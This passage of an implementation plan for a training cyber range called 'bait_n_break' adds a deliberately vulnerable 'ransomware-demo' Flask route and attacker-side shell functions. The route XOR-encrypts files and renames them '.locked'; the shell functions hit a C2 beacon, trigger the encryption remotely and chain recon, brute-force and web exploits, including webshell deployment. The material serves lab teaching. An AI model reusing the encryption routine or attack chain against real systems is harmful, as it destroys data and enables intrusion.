(No `backups`/`secrets` mount changes - those stay `:ro`. Only `deception` needs write access, for the ransomware-demo target directory.)

- [ ] **Step 2: Add the new route to `bait_n_break/victim/webapp/app.py`**

Insert this route right after the existing `c2_beacon()` function and before the `if __name__ == "__main__":` block:

```python
# --- Impact: remote ransomware-demo trigger (post-exploitation) ---


@app.route("/admin/ransomware-demo", methods=["POST"])
def admin_ransomware_demo():
    # Intentional: reachable post-exploitation action. Reimplements the
    # host-side ransomware-demo (fixed-key encryption) container-side so it
    # is actually triggerable through the webshell/RCE an attacker has
    # already achieved via /shell. Pure Python, no subprocess/shell-out to
    # the host, no Docker socket - strictly scoped to ransomware_target/,
    # matching the host-side version's confinement guarantee.
    target_dir = "/bait/deception/ransomware_target"
    os.makedirs(target_dir, exist_ok=True)
    key = b"lab-demo-key-not-secret"
    if not os.listdir(target_dir):
        with open(os.path.join(target_dir, "document_demo.txt"), "w") as fh:
            fh.write("dummy sensitive file (remote-triggered demo)\n")
    encrypted = 0
    for name in os.listdir(target_dir):
        path = os.path.join(target_dir, name)
        if not os.path.isfile(path) or name.endswith(".locked"):
            continue
        with open(path, "rb") as fh:
            data = fh.read()
        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        with open(path + ".locked", "wb") as fh:
            fh.write(xored)
        os.remove(path)
        encrypted += 1
    with open(os.path.join(target_dir, "README_RESTORE.txt"), "w") as fh:
        fh.write(
            "This is a harmless training-lab demo. Files in this directory "
            "were encrypted with a fixed, known key for educational "
            "purposes only.\n"
        )
    return {"status": "ok", "files_encrypted": encrypted}
```

- [ ] **Step 3: Syntax-check**

Run: `python3 -c "import ast; ast.parse(open('bait_n_break/victim/webapp/app.py').read())"` and `python3 -c "import yaml; yaml.safe_load(open('bait_n_break/victim/webapp/docker-compose.yml'))"` (or `docker compose -f bait_n_break/victim/webapp/docker-compose.yml config` if Docker is available)
Expected: no output, exit code 0 for both.

- [ ] **Step 4: Verify what's checkable without Docker; defer the rest**

The new route hardcodes `/bait/deception/ransomware_target`, a path that only exists inside the container (bind-mounted from `.state/bait/deception` on the host). Running `python3 app.py` directly on the implementer's machine (not in Docker) will attempt to create `/bait/deception/ransomware_target` at the real filesystem root, which will fail with a permission error on most systems - **this is expected**, not a bug. Confirm:

1. The syntax checks from Step 3 pass.
2. Read through the new route's code once more and confirm by inspection: every file path it touches is built from `target_dir` (itself hardcoded to `/bait/deception/ransomware_target`), there is no `subprocess`/`os.system`/shell-out call anywhere in the new code, and nothing references any other directory.
3. If Docker happens to be available in this environment, run `docker compose -f bait_n_break/victim/webapp/docker-compose.yml up -d --build`, then `curl -X POST http://127.0.0.1:8080/admin/ransomware-demo` and confirm it returns `{"status": "ok", "files_encrypted": ...}`, then `docker compose -f bait_n_break/victim/webapp/docker-compose.yml down -v`. If Docker is unavailable, state that clearly in the report - this is the same Docker-gated situation Phase 1 hit for its `/files/<area>/` routes.

- [ ] **Step 5: Commit**

```bash
git add bait_n_break/victim/webapp/docker-compose.yml bait_n_break/victim/webapp/app.py
git commit -m "Make ransomware-demo remotely triggerable via a new admin route"
```

---

## Task 8: Attacker-side malware/C2 module

**Files:**
- Create: `bait_n_break/attacker/lib_malware_c2.sh`

**Interfaces:**
- Consumes: `target_ensure_set()` (Task 2); `results_record()` (Task 1); the Phase 1 `/c2/beacon` route; the Task 7 `POST /admin/ransomware-demo` route.
- Produces (consumed by Task 9): `c2_beacon_check()`, `ransomware_trigger()`.

- [ ] **Step 1: Write `bait_n_break/attacker/lib_malware_c2.sh`**

```bash
#!/usr/bin/env bash
# Attacker-side malware/C2 actions: C2 beacon check, remote ransomware-demo
# trigger via the webshell/RCE already achieved.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

c2_beacon_check() {
    target_ensure_set || { echo "[c2] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    echo "=== C2 beacon check against ${base}/c2/beacon ==="
    local resp code body
    resp="$(curl -s -w '\n%{http_code}' "${base}/c2/beacon")"
    code="${resp##*$'\n'}"
    body="${resp%$'\n'*}"
    echo "$body"
    if [ "$code" = "200" ]; then
        results_record "c2_beacon_check" "SUCCESS" "quiet" "beacon check-in acknowledged"
    else
        results_record "c2_beacon_check" "FAILED" "quiet" "beacon endpoint unreachable (HTTP ${code})"
    fi
}

ransomware_trigger() {
    target_ensure_set || { echo "[ransomware] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    echo "=== Triggering remote ransomware demo against ${base}/admin/ransomware-demo ==="
    local resp code body
    resp="$(curl -s -w '\n%{http_code}' -X POST "${base}/admin/ransomware-demo")"
    code="${resp##*$'\n'}"
    body="${resp%$'\n'*}"
    echo "$body"
    if [ "$code" = "200" ]; then
        results_record "ransomware_trigger" "VULNERABLE" "loud" "ransomware demo triggered remotely"
    else
        results_record "ransomware_trigger" "FAILED" "loud" "trigger endpoint unreachable (HTTP ${code})"
    fi
}
```

- [ ] **Step 2: Syntax-check**

Run: `bash -n bait_n_break/attacker/lib_malware_c2.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify `c2_beacon_check` against a locally-run copy of the vulnerable app (no Docker needed)**

```bash
cd bait_n_break/victim/webapp
python3 app.py &
sleep 1
cd - >/dev/null

bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="127.0.0.1"
export TARGET_PORT="5000"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_malware_c2.sh
state_init
c2_beacon_check
results_summary
'
kill %1
```
Expected: printed body containing `"status": "ack"`, and a `[c2_beacon_check] [SUCCESS]` line in the results summary.

- [ ] **Step 4: Verify `ransomware_trigger`'s request/response handling, noting the expected Docker-gated failure**

```bash
cd bait_n_break/victim/webapp
python3 app.py &
sleep 1
cd - >/dev/null

bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="127.0.0.1"
export TARGET_PORT="5000"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_malware_c2.sh
state_init
ransomware_trigger
results_summary
'
kill %1
```
Expected: on a non-Docker run, the `/bait/deception/ransomware_target` path from Task 7 doesn't exist at the filesystem root and the Flask route will likely raise a permission error, returning a non-200 status - confirm `ransomware_trigger` handles this gracefully (prints the error body, records `[FAILED]`, does not crash the shell function itself). This confirms the *attacker-side* function's error handling is correct; the *victim-side* route's actual success path is Docker-gated per Task 7's Step 4.

- [ ] **Step 5: Commit**

```bash
git add bait_n_break/attacker/lib_malware_c2.sh
git commit -m "Add attacker-side malware/C2 module"
```

---

## Task 9: Attacker console (wires everything together, replaces Phase 1 placeholder)

**Files:**
- Modify: `bait_n_break/tui/attacker_console.sh`

**Interfaces:**
- Consumes: `ui_menu()` (Phase 1 `lib_ui.sh`); `results_init()`, `results_summary()`, `results_clear()` (Task 1); `target_prompt()`, `target_ensure_set()` (Task 2); `recon_scan()` (Task 4); `bruteforce_ssh()`, `bruteforce_ftp()`, `bruteforce_http()` (Task 5); `exploit_sqli()`, `exploit_command_injection()`, `exploit_webshell_deploy()`, `exploit_xss_poc()` (Task 6); `crawl_leaked_files()` (Task 3); `c2_beacon_check()`, `ransomware_trigger()` (Task 8).
- Produces: `attacker_console()` — already the function `bait_n_break/tui/main_menu.sh` (Phase 1) sources this exact file and calls when the user selects "Attacker" from the top-level menu; no change needed to `main_menu.sh` itself.

- [ ] **Step 1: Replace the full contents of `bait_n_break/tui/attacker_console.sh`**

```bash
#!/usr/bin/env bash
# Attacker (Kali) role console: target configuration, per-scenario attack
# execution, Run All Scenarios, results summary.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

attacker_console() {
    # shellcheck source=bait_n_break/attacker/lib_results.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_results.sh"
    # shellcheck source=bait_n_break/attacker/lib_target.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_target.sh"
    # shellcheck source=bait_n_break/attacker/lib_recon.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_recon.sh"
    # shellcheck source=bait_n_break/attacker/lib_bruteforce.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_bruteforce.sh"
    # shellcheck source=bait_n_break/attacker/lib_web_exploit.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_web_exploit.sh"
    # shellcheck source=bait_n_break/attacker/lib_crawler.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_crawler.sh"
    # shellcheck source=bait_n_break/attacker/lib_malware_c2.sh
    source "${BNB_ROOT}/bait_n_break/attacker/lib_malware_c2.sh"

    results_init

    while true; do
        local choice
        choice="$(ui_menu "Attacker Console" "Select an action:" \
            "1" "Set/Change Target" \
            "2" "Recon" \
            "3" "Brute-force" \
            "4" "Web Exploitation" \
            "5" "Crawler (bait exfiltration)" \
            "6" "Malware/C2" \
            "7" "Run All Scenarios" \
            "8" "Results Summary" \
            "9" "Back")" || break

        case "$choice" in
            1) target_prompt ;;
            2) attacker_run_and_pause recon_scan ;;
            3) attacker_run_and_pause attacker_bruteforce_menu ;;
            4) attacker_run_and_pause attacker_web_exploit_menu ;;
            5) attacker_run_and_pause crawl_leaked_files ;;
            6) attacker_run_and_pause attacker_malware_c2_menu ;;
            7) attacker_run_and_pause attacker_run_all ;;
            8) ui_msgbox "Results Summary" "$(results_summary)" ;;
            9|"") break ;;
        esac
    done
}

attacker_run_and_pause() {
    clear
    "$@"
    echo ""
    read -r -p "Press Enter to continue..." _
}

attacker_bruteforce_menu() {
    bruteforce_ssh
    bruteforce_ftp
    bruteforce_http
}

attacker_web_exploit_menu() {
    exploit_sqli
    exploit_command_injection
    exploit_webshell_deploy
    exploit_xss_poc
}

attacker_malware_c2_menu() {
    c2_beacon_check
    ransomware_trigger
}

attacker_run_all() {
    echo "=== Run All Scenarios: full kill-chain against ${TARGET_IP:-<not set>} ==="
    target_ensure_set || { echo "No target set - aborting Run All Scenarios."; return 1; }
    results_clear
    recon_scan
    attacker_bruteforce_menu
    attacker_web_exploit_menu
    crawl_leaked_files
    attacker_malware_c2_menu
    echo ""
    echo "=== Run All Scenarios complete ==="
    results_summary
}
```

- [ ] **Step 2: Syntax-check**

Run: `bash -n bait_n_break/tui/attacker_console.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify the full menu flow end-to-end against a locally-run copy of the vulnerable app (no Docker needed for the HTTP-only scenarios; SSH/FTP brute-force and the live ransomware trigger stay Docker-gated per Tasks 5/7/8)**

```bash
cd bait_n_break/victim/webapp
python3 app.py &
sleep 1
cd - >/dev/null

TARGET_IP=127.0.0.1 TARGET_PORT=5000 printf '2\n7\n8\n9\n3\n' | ./run.sh
kill %1
```
Expected: selecting Attacker (option 2 from the top-level menu), then Run All Scenarios (option 7), shows the live terminal output of every scenario (recon, brute-force attempts, all four web exploits, crawler, C2 beacon check, and a failed-but-graceful ransomware trigger attempt per Task 8's note) followed by "Press Enter to continue", then Results Summary (option 8) shows the accumulated table via `ui_msgbox`, then Back (9) and top-level Exit (3) return cleanly with exit code 0.

- [ ] **Step 4: Commit**

```bash
git add bait_n_break/tui/attacker_console.sh
git commit -m "Wire attacker console: target config, scenarios, Run All, results summary"
```

---

## Task 10: setup.sh — install attacker tooling

**Files:**
- Modify: `bait_n_break/../setup.sh` (i.e. `setup.sh` at the repo root)

**Interfaces:**
- Consumes: none new.
- Produces: `hydra`, `sqlmap`, `nmap` installed best-effort alongside Phase 1's existing installs.

- [ ] **Step 1: Modify `setup.sh`'s `main()` function**

In the `ubuntu|kali|debian)` branch, add three more `ensure_pkg` calls right after the existing `ensure_pkg iproute2` line and before the `if ! command -v docker` check:

```bash
            ensure_pkg iproute2
            ensure_pkg hydra
            ensure_pkg sqlmap
            ensure_pkg nmap
            if ! command -v docker >/dev/null 2>&1; then
```

(Only these three new lines are inserted — everything else in `setup.sh` stays exactly as Phase 1 left it.)

- [ ] **Step 2: Syntax-check**

Run: `bash -n setup.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify `main`'s control flow still parses correctly and `ensure_pkg` is still called with the right package names**

```bash
grep -n "ensure_pkg" setup.sh
```
Expected: seven `ensure_pkg` calls total (the four from Phase 1: `whiptail`, `inotify-tools`, `iproute2`, and now `hydra`, `sqlmap`, `nmap` — that's six standalone `ensure_pkg` lines, plus the `ensure_pkg` function definition itself, for 7 lines containing that string). Full end-to-end package installation is environment-dependent (requires `sudo`/`apt-get` on Ubuntu/Kali) — this Windows dev environment can't run it for real; note that in the report, matching how Phase 1's `setup.sh` task handled the same limitation.

- [ ] **Step 4: Commit**

```bash
git add setup.sh
git commit -m "Install attacker tooling (hydra, sqlmap, nmap) in setup.sh"
```
